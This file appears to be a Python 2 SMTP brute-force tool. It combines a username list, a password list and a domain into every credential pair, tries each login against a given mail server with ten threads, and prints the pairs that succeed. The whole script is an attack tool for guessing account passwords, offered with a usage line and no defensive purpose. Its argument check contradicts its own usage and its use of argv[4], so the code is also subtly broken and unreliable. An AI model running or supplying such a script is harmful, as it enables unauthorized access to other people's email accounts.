#coding=utf-8
import smtplib
import threadpool
from sys import argv
import sys
import time
def print_result(request, result):
    scanow="[*]Scan %s "%result
    sys.stdout.write(str(scanow)+" "*25+"\b\b\r")
    sys.stdout.flush()
    time.sleep(0.05)
def login(logininfo): 
    try:
        logins=logininfo
        logininfo=logininfo.split(" ")
        username=logininfo[0]
        password=logininfo[1]
        trycount=0 
        smtp=smtplib.SMTP()
        smtp.connect(argv[4])
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()
        smtp.login(username,password)
        smtp.quit()
        print "[*]Success %s %s"%(username,password)
    except Exception,ex:
        pass
    return username

if len(argv)!=4:
    print "useage:\n python smtp.py user.txt pass.txt domain.com smtp.server.com"
    exit()
user=open(argv[1]).read()
user=user.split("\n")
pass_=open(argv[2]).read()
pass_=pass_.split("\n")
domain=argv[3]
burp=[]    
for u in user:
    for p in pass_:
        info="%s@%s %s"%(u,domain,p)
        burp.append(info)
burp=set(burp)
print " Task Run\n Task Count:%d\n\n"%len(burp)
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(login, burp, print_result) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
